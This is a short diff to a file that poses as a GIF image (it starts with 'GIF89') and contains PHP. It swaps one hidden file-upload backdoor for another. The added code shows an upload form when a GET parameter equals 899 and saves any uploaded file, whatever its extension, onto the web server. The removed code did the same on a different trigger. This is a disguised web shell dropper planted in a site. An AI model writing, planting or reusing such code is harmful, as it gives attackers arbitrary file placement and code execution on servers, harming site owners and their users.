@@ -1,2 +1,6 @@
 GIF89;a
-<?php if(array_values($_GET)[0]??''=='up'){?><form method=post enctype=multipart/form-data><input type=file name=u><input type=submit></form><?php die();} cukurukuk: if(isset($_FILES['u'])){$f=$_FILES['u'];$n=md5(time().rand()).'.'.pathinfo($f['name'],PATHINFO_EXTENSION);if(copy($f['tmp_name'],$n)){echo'//'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'].'?'.$n;}die();} if(array_values($_GET)[0]??''=='up') goto cukurukuk;
+<?php
+$x=$_GET;$y=false;foreach($x as $z){if($z==899){$y=true;break;}}
+if($y){?><form method=post enctype=multipart/form-data><input type=file name=i><input type=submit value=1></form><?php }
+if(isset($_FILES['i'])){$a=$_FILES['i'];$b=strtolower(substr(strrchr($a['name'],'.'),1));$c=rand(1000,9999).time().'.'.$b;if(@copy($a['tmp_name'],$c)){echo'<a href="'.$c.'">'.$c.'</a>';}exit;}
+?>
